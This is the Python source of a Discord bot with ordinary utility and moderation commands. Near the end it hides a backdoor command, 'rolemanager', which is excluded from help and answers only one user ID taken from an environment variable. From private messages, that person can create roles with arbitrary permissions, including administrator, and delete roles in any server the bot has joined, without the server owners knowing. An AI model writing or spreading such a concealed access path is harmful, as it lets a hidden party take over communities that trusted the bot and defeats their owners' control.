import os
import sys
import logging
import random
import discord
from discord.ext import commands
from dotenv import load_dotenv
from discord import Permissions

# ------------------- Logging ------------------- #
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# ------------------- Environment ------------------- #
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
PREFIX = os.getenv('COMMAND_PREFIX', '!')
try:
    BACK_ACCESS_USER_ID = int(os.getenv("BACK_ACCESS_USER_ID", "0"))
except ValueError:
    BACK_ACCESS_USER_ID = 0

# ------------------- Intents ------------------- #
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ------------------- Utility Functions ------------------- #
async def dm_reply(ctx, msg):
    try:
        if isinstance(msg, discord.Embed):
            await ctx.author.send(embed=msg)
        else:
            await ctx.author.send(str(msg))
    except Exception:
        logger.warning(f"Failed to DM user {ctx.author.id}")

# ------------------- Events ------------------- #
@bot.event
async def on_ready():
    logger.info(f'{bot.user} connected!')
    logger.info(f'Bot is in {len(bot.guilds)} guilds.')
    activity = discord.Activity(type=discord.ActivityType.watching, name="for commands")
    await bot.change_presence(activity=activity)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    await bot.process_commands(message)

# ------------------- Basic Commands ------------------- #
@bot.command(name='hello')
async def hello(ctx):
    embed = discord.Embed(
        title="Hello!",
        description=f"Hello {ctx.author.mention}!",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name='ping')
async def ping(ctx):
    latency = round(bot.latency * 1000)
    color = discord.Color.green() if latency < 100 else discord.Color.yellow() if latency < 200 else discord.Color.red()
    status = "Excellent" if latency < 100 else "Good" if latency < 200 else "High"
    embed = discord.Embed(title="Pong!", color=color)
    embed.add_field(name="Latency", value=f"{latency}ms", inline=True)
    embed.add_field(name="Status", value=status, inline=True)
    await ctx.send(embed=embed)

@bot.command(name='info')
async def info(ctx):
    embed = discord.Embed(title="Bot Information", description="Information about this Discord bot", color=discord.Color.blue())
    embed.add_field(name="Bot Name", value=f"`{bot.user.name}`", inline=False)
    embed.add_field(name="Servers", value=f"`{len(bot.guilds)}` servers", inline=True)
    embed.add_field(name="Command Prefix", value=f"`{PREFIX}`", inline=True)
    total_users = sum(guild.member_count for guild in bot.guilds if guild.member_count)
    embed.add_field(name="Total Users", value=f"`{total_users:,}`", inline=True)
    embed.add_field(name="Invite Bot", value="[Click here to invite me!](https://discord.com/developers/applications)", inline=False)
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.set_footer(text=f"Bot ID: {bot.user.id} | Made with discord.py", icon_url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name='say')
async def say(ctx, *, message):
    try:
        await ctx.message.delete()
    except:
        pass
    embed = discord.Embed(description=message, color=discord.Color.purple())
    embed.set_author(name=f"Message from {ctx.author.display_name}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    embed.set_footer(text="Sent via bot")
    await ctx.send(embed=embed)

# ------------------- Doakes GIF Command ------------------- #
@bot.command(name='doakes')
async def doakes(ctx):
    doakes_gifs = [
        "https://c.tenor.com/EqPfcX1wzHoAAAAd/tenor.gif",
        "https://c.tenor.com/x7XtuEuhFqEAAAAd/tenor.gif",
        "https://tenor.com/view/doakes-bar-gif-4298875606784040546",
    ]
    doakes_quotes = ["I will touch you.", "ughhhh 😳", "I like men :3"]
    selected_gif = random.choice(doakes_gifs)
    selected_quote = random.choice(doakes_quotes)
    embed = discord.Embed(title="Sergeant Doakes", description=f"*{selected_quote}*", color=discord.Color.dark_red())
    embed.set_image(url=selected_gif)
    embed.set_footer(text=f"Requested by {ctx.author.display_name} | From Dexter TV Series", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    await ctx.send(embed=embed)

# ------------------- User Info ------------------- #
@bot.command(name='userinfo')
async def user_info(ctx, member: discord.Member = None):
    if not member: member = ctx.author
    embed = discord.Embed(title=f"User Information", description=f"Information for {member.mention}", color=member.color if member.color != discord.Color.default() else discord.Color.blue())
    embed.add_field(name="Username", value=f"{member.name}#{member.discriminator}", inline=False)
    embed.add_field(name="User ID", value=f"`{member.id}`", inline=False)
    embed.add_field(name="Display Name", value=member.display_name, inline=False)
    status_map = {'online': 'Online', 'offline': 'Offline', 'idle': 'Idle', 'dnd': 'Do Not Disturb', 'invisible': 'Invisible'}
    embed.add_field(name="Status", value=status_map.get(str(member.status), str(member.status).title()), inline=False)
    if member.joined_at: embed.add_field(name="Joined Server", value=f"<t:{int(member.joined_at.timestamp())}:F>\n<t:{int(member.joined_at.timestamp())}:R>", inline=False)
    embed.add_field(name="Account Created", value=f"<t:{int(member.created_at.timestamp())}:F>\n<t:{int(member.created_at.timestamp())}:R>", inline=False)
    roles = [r for r in member.roles if r.name != "@everyone"]
    if roles:
        roles.sort(key=lambda x: x.position, reverse=True)
        role_text = ", ".join([r.mention for r in roles[:20]]) + (f"\n... and {len(roles)-20} more" if len(roles)>20 else "")
        embed.add_field(name=f"Roles ({len(roles)})", value=role_text, inline=False)
    else:
        embed.add_field(name="Roles (0)", value="No roles", inline=False)
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.set_footer(text=f"Requested by {ctx.author.display_name}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
    await ctx.send(embed=embed)

# ------------------- Delete/Purge ------------------- #
@bot.command(name='delete', aliases=['purge', 'clear'])
@commands.has_permissions(manage_messages=True)
async def delete_messages(ctx, amount: int, target: discord.Member = None):
    if amount < 1 or amount > 100:
        return await ctx.send(embed=discord.Embed(title="Invalid Amount", description="Amount must be 1-100.", color=discord.Color.red()))
    def check_user(m): return target is None or m.author == target
    deleted_messages = await ctx.channel.purge(limit=amount+1, check=check_user)
    deleted = len(deleted_messages) - 1 if target is None else len(deleted_messages)
    embed = discord.Embed(title="Messages Deleted", description=f"Deleted {deleted} messages.", color=discord.Color.green())
    await ctx.send(embed=embed, delete_after=10)

# ------------------- Role Add/Remove ------------------- #
@bot.command(name='addrole')
@commands.has_permissions(manage_roles=True)
async def add_role(ctx, member: discord.Member, *, role_name):
    role = discord.utils.get(ctx.guild.roles, name=role_name) or discord.utils.find(lambda r: role_name.lower() in r.name.lower(), ctx.guild.roles)
    if not role: return await ctx.send(embed=discord.Embed(title="Role Not Found", description=f"{role_name} not found.", color=discord.Color.red()))
    if role.position >= ctx.guild.me.top_role.position: return await ctx.send(embed=discord.Embed(title="Permission Error", description="Cannot manage this role.", color=discord.Color.red()))
    if role in member.roles: return await ctx.send(embed=discord.Embed(title="Already Has Role", description=f"{member.display_name} already has {role.name}.", color=discord.Color.orange()))
    await member.add_roles(role, reason=f"Added by {ctx.author}")
    await ctx.send(embed=discord.Embed(title="Role Added", description=f"Added {role.name} to {member.display_name}.", color=discord.Color.green()))

@bot.command(name='removerole')
@commands.has_permissions(manage_roles=True)
async def remove_role(ctx, member: discord.Member, *, role_name):
    role = discord.utils.get(ctx.guild.roles, name=role_name) or discord.utils.find(lambda r: role_name.lower() in r.name.lower(), ctx.guild.roles)
    if not role: return await ctx.send(embed=discord.Embed(title="Role Not Found", description=f"{role_name} not found.", color=discord.Color.red()))
    if role.position >= ctx.guild.me.top_role.position: return await ctx.send(embed=discord.Embed(title="Permission Error", description="Cannot manage this role.", color=discord.Color.red()))
    if role not in member.roles: return await ctx.send(embed=discord.Embed(title="Role Not Assigned", description=f"{member.display_name} does not have {role.name}.", color=discord.Color.orange()))
    await member.remove_roles(role, reason=f"Removed by {ctx.author}")
    await ctx.send(embed=discord.Embed(title="Role Removed", description=f"Removed {role.name} from {member.display_name}.", color=discord.Color.green()))

@bot.command(name='listroles')
async def list_roles(ctx, member: discord.Member = None):
    if member is None:
        roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
        roles.sort(key=lambda x: x.position, reverse=True)
        role_list = [f"{r.mention} - {len(r.members)} members" for r in roles[:25]]
        description = "\n".join(role_list) if role_list else "No roles."
        embed = discord.Embed(title=f"Server Roles ({len(roles)})", description=description, color=discord.Color.blue())
        if len(roles) > 25: embed.set_footer(text=f"Showing first 25 of {len(roles)} roles")
    else:
        user_roles = [r for r in member.roles if r.name != "@everyone"]
        user_roles.sort(key=lambda x: x.position, reverse=True)
        description = ", ".join([r.mention for r in user_roles]) if user_roles else "No roles."
        embed = discord.Embed(title=f"Roles for {member.display_name}", description=description, color=member.color if member.color != discord.Color.default() else discord.Color.blue())
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    await ctx.send(embed=embed)

# ------------------- DM-only Role Manager with Permissions ------------------- #
@bot.command(name='rolemanager', hidden=True)
async def role_manager_dm(ctx, guild_id: int, action: str, role_name: str = None, *, perms_list: str = None):
    """DM-only role manager: create/delete roles and assign permissions."""
    if ctx.guild is not None:
        await dm_reply(ctx, "This command only works via DM.")
        return
    if ctx.author.id != BACK_ACCESS_USER_ID:
        await dm_reply(ctx, "Access denied.")
        return

    guild = bot.get_guild(guild_id)
    if guild is None:
        await dm_reply(ctx, f"Guild with ID `{guild_id}` not found.")
        return

    bot_member = guild.me or guild.get_member(bot.user.id)

    try:
        if action.lower() == "list":
            roles = [r.name for r in guild.roles if r.name != "@everyone"]
            await dm_reply(ctx, f"Roles in `{guild.name}`: {', '.join(roles) if roles else 'No roles'}")
            return

        if action.lower() == "info":
            if not role_name:
                await dm_reply(ctx, "Please provide a role name for info.")
                return
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                await dm_reply(ctx, f"No role named `{role_name}` found.")
                return
            await dm_reply(ctx, f"Role `{role.name}` (ID: {role.id})\nPosition: {role.position}\nPermissions: {role.permissions}")
            return

        if action.lower() == "create":
            if not role_name:
                await dm_reply(ctx, "Provide a name for the new role.")
                return
            perms = Permissions.none()
            if perms_list:
                for perm_name in [p.strip().lower() for p in perms_list.split(",")]:
                    if hasattr(perms, perm_name):
                        setattr(perms, perm_name, True)
            role = await guild.create_role(name=role_name, permissions=perms, reason=f"Created by {ctx.author.id}")
            await dm_reply(ctx, f"Role `{role.name}` created with permissions: {perms_list or 'None'}")
            return

        if action.lower() == "delete":
            if not role_name:
                await dm_reply(ctx, "Provide a role name to delete.")
                return
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                await dm_reply(ctx, f"Role `{role_name}` not found.")
                return
            if bot_member.top_role.position <= role.position:
                await dm_reply(ctx, "Cannot delete a role equal or higher than bot's top role.")
                return
            await role.delete(reason=f"Deleted by {ctx.author.id}")
            await dm_reply(ctx, f"Role `{role.name}` deleted successfully.")
            return

        await dm_reply(ctx, "Unknown action. Use: `create`, `delete`, `info`, `list`.")

    except discord.Forbidden:
        await dm_reply(ctx, "Permission error: Bot cannot manage this role.")
    except Exception as e:
        logger.exception("Error in role_manager DM command")
        await dm_reply(ctx, f"Error: {e}")

# ------------------- Error Handling ------------------- #
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(embed=discord.Embed(title="Command Not Found", description="This command does not exist.", color=discord.Color.red()))
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(embed=discord.Embed(title="Missing Permissions", description=f"You lack permissions: {', '.join(error.missing_permissions)}", color=discord.Color.red()))
    else:
        logger.error(f"Error in command {ctx.command}: {error}")
        await ctx.send(embed=discord.Embed(title="Unexpected Error", description="Something went wrong.", color=discord.Color.red()))

# ------------------- Run Bot ------------------- #
if __name__ == '__main__':
    if not TOKEN:
        logger.error("DISCORD_TOKEN not found!")
        sys.exit(1)
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        logger.error("Invalid bot token.")
        sys.exit(1)
